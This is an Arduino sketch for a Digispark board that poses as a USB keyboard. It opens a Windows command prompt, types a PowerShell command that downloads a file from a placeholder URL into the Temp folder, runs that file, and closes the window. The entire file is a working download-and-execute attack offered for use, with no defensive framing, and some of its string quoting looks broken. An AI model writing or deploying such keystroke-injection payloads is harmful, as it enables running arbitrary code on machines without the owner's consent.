#include "DigiKeyboard.h"
#define MOD_SHIFT_LEFT  226
#define MOD_ALT_LEFT  A0
void setup() {
  // put your setup code here, to run once:
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("C:\Windows\System32\cmd.exe"));
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile('link on file, that you want to be downloaded','%Temp%/yourfile'));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print(F("%Temp%/yourfile"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);  
DigiKeyboard.delay(2000);
DigiKeyboard.print(F("exit"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


